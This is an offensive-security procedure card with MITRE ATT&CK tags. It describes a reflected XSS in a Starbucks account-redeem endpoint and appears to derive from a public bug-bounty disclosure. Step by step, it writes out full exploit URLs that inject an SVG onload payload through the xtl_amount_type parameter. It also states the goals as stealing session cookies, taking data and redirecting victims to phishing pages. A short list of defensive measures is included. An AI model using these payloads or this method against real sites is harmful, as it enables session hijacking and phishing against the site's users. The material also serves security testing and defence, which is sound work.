---
tags:
  - xss
  - reflected-xss
  - parameter-manipulation
  - web-vulnerability
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.181Z'
sub_techniques: []
id: f1a123e7-23dd-42ac-9557-c898b934ee35
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Trigger-Reflected-XSS-in-Starbucks-Redeem-Endpoint

## Summary

This procedure exploits a reflected XSS vulnerability in the Starbucks account creation redeem endpoint by manipulating URL parameters xtl_amount, xtl_coupon_code, and xtl_amount_type. The parameters are reflected unsanitized, but execution requires setting complementary parameters to non-empty values, allowing arbitrary JavaScript in the victim's browser for session hijacking or data theft.

## Description

The vulnerability occurs because user-supplied values in the URL parameters are inserted into the HTML response without encoding. Testing in Firefox reveals that xtl_amount_type payloads only execute when xtl_coupon_code and xtl_amount are non-empty, likely due to server-side validation or rendering conditions that skip escaping. An attacker crafts a malicious link; when clicked by a victim, it executes JS in the Starbucks domain context, enabling cookie theft, phishing, or further attacks. No authentication is needed, making it suitable for social engineering via email or ads.

## Requirements

1. Web browser like Firefox 52.7.3 for manual URL testing
2. Public access to https://www.starbucks.com/account/create/redeem/MCP131XSR
3. Victim interaction (clicking the link)
4. Basic knowledge of URL encoding for payloads

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity encoding) for all reflected parameters
- Use Content Security Policy (CSP) to restrict inline scripts and SVG execution
- Validate and sanitize input parameters server-side, rejecting suspicious patterns like <script> or onload
- Monitor for anomalous parameter values in access logs and alert on potential payloads

## Objectives

1. Execute arbitrary JavaScript in the victim's browser context
2. Steal session cookies or sensitive data from Starbucks domain
3. Redirect to phishing sites or perform other malicious actions

## Instructions

### Step 1: Access the Endpoint with Sample Parameters

**Context**: Load the redeem page with default parameters to confirm reflection and baseline behavior.

Navigate in Firefox to:

`https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=DOLLAR_VALUE`

> Inspect the page source to verify parameters are reflected in HTML.

### Step 2: Inject the XSS Payload

**Context**: Modify xtl_amount_type to include a test payload, URL-encoded to bypass transmission issues; observe reflection without execution.

Update URL to set xtl_amount_type=ayn</script><svg/onload=alert(document.domain)> (encoded: ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E)

Full URL:

`https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E`

> Check source: payload appears but no alert fires.

### Step 3: Activate with Complementary Parameters

**Context**: Set non-empty values for xtl_coupon_code and xtl_amount to trigger the condition for payload execution.

Change to xtl_coupon_code=hkjhkjh, xtl_amount=jhkjhj, retain payload.

Full URL:

`https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=hkjhkjh&xtl_amount=jhkjhj&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E`

> Alert should pop up with document.domain, confirming XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]

## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
